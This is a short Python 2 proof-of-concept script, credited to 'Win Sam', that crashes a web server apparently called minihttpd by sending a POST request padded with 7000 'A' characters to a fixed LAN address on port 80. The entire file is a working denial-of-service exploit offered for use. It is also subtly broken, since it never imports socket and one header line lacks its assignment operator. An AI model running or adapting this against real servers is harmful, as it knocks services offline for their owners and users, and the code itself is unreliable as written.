#!/usr/bin/env python

# author: Win Sam
# description: Crash with 7000 bytes  | POST METHOD

crash ="A" * 7000
buffer ="POST "+crash+" HTTP/1.1\r\n"
buffer+="Host: 127.0.0.1\r\n"
buffer+"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r\n"
buffer+="Accept-Encoding: gzip, deflate\r\n"
buffer+="Cookie: UserID=; PassWD=\r\n"
buffer+="Connection: close\r\n"
buffer+="Upgrade-Insecure-Requests: 1\r\n\r\n"

print "[+] sending evil minihttpd.exe"
print len(buffer)
exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit.connect(("192.168.11.177",80))
exploit.send(buffer)
exploit.close()
